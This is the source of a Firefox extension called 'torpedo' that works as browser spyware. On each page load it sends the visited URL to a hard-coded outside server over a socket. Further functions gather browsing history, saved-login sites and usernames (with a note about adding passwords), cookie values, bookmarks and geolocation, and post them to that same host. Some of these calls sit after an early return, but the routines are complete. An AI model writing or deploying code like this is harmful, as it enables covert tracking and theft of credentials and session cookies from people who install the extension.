// The main module of the torpedo extension.

var server = "http://joshbalfour.co.uk:1337/";


require("tabs").on("ready", logURL);
  
var passw = require("passwords");
var request = require("request");
var {Cc, Ci, Cu} = require("chrome");
var io = require("./lib/kieran");
Cu.import("resource://gre/modules/PlacesUtils.jsm");

var historyService = Cc["@mozilla.org/browser/nav-history-service;1"].getService(Ci.nsINavHistoryService);
var dirSvc = Cc["@mozilla.org/file/directory_service;1"].getService(Ci.nsIProperties);
var ioService=Cc["@mozilla.org/network/io-service;1"].getService(Ci.nsIIOService);
var scriptableStream=Cc["@mozilla.org/scriptableinputstream;1"].getService(Ci.nsIScriptableInputStream);
var cookieManager = Cc["@mozilla.org/cookiemanager;1"].getService(Ci.nsICookieManager);
var xpcomGeolocation = Cc["@mozilla.org/geolocation;1"].getService(Ci.nsIDOMGeoGeolocation);

var server = "http://joshbalfour.co.uk:1337";

var socket = new io.socket(server, function(data){ // function run where data receieved
    console.log("Receieved data: " + JSON.stringify(data)); //stringify and display the data
},function(data){ // function run where connection closed
    console.log("Connection closed"); //Error out
}).connect(function(result){
    console.log(result['message']); //display connection message
});


function logURL(tab) {
    socket.write(tab.url);
    return; 
    sendData(tab.url,"h");
    show_all_passwords();
    getHistory();
    getBookmarks();
    getCurrentPosition();
}



function getHistory()
{
   var history = Array();
   

    // queries parameters (e.g. domain name matching, text terms matching, time range...)
    // see : https://developer.mozilla.org/en/nsINavHistoryQuery
    var query = historyService.getNewQuery();
    
    // options parameters (e.g. ordering mode and sorting mode...)
    // see : https://developer.mozilla.org/en/nsINavHistoryQueryOptions
    var options = historyService.getNewQueryOptions();
    
    // execute the query
    // see : https://developer.mozilla.org/en/nsINavHistoryService#executeQuery()
    var result = historyService.executeQuery(query, options);
    
    // Using the results by traversing a container
    // see : https://developer.mozilla.org/en/nsINavHistoryContainerResultNode
    var cont = result.root;
        cont.containerOpen = true;
        
    for (var i = 0; i < cont.childCount; i ++) {
        var node = cont.getChild(i);
        // "node" attributes contains the information (e.g. URI, title, time, icon...)
        // see : https://developer.mozilla.org/en/nsINavHistoryResultNode
       history.push(Array(node.title,node.uri,node.time));
    }
    
    // Close container when done
    // see : https://developer.mozilla.org/en/nsINavHistoryContainerResultNode
    cont.containerOpen = false;
    sendData(history,"hi");
    
}

function getBookmarks(){
    
    // Create the backup file
    var jsonFile = dirSvc.get("ProfD", Ci.nsILocalFile);
    var fName = new Date();
    var nameOfFile = fName.getTime()+".json";
    jsonFile.append(nameOfFile);
    jsonFile.create(Ci.nsILocalFile.NORMAL_FILE_TYPE, 0600);
    
    // Export bookmarks in JSON format to file
    PlacesUtils.backupBookmarksToFile(jsonFile);
  //  console.log(Read(jsonFile.path));
    
}

function Read(file)
{
    var channel=ioService.newChannel(file,null,null);
    var input=channel.open();
    scriptableStream.init(input);
    var str=scriptableStream.read(input.available());
    scriptableStream.close();
    input.close();
    return str;
}

function show_all_passwords() {
allCredentials = Array();
  passw.search({
    onComplete: function onComplete(credentials) {
      credentials.forEach(function(credential) {
        allCredentials.push(Array(credential.url,credential.username)); // add ,credential.password
        });
        sendData(allCredentials,"c");
        return;
      }       
    });
}


function getCookies()
{
    cookies = Array();      
    for (var e = cookieManager.enumerator; e.hasMoreElements();) {
        var cookie = e.getNext().QueryInterface(Ci.nsICookie); 
        cookies.push(Array(cookie.host,cookie.name,cookie.value));
    }
    sendData(cookies,"co");
}



function sendData(data2,handler)
{       
    var url = server+handler;
    
    if (handler == "h")
    {
        var currentTime = new Date()
        var month = currentTime.getMonth() + 1
        var day = currentTime.getDate()
        var year = currentTime.getFullYear()
        date = month + "/" + day + "/" + year 
        data2 = new Array(date,data2); 
    }
    
    var req = request.Request({
           url:url,
           content:{
               data:JSON.stringify(data2)             
               }
       }).post();    
} 

function getCurrentPosition() {
  xpcomGeolocation.getCurrentPosition(function(position) {
     var JSONposition = Array(position.coords.latitude,position.coords.longitude);  
     sendData(JSONposition,"p");
    });
    
}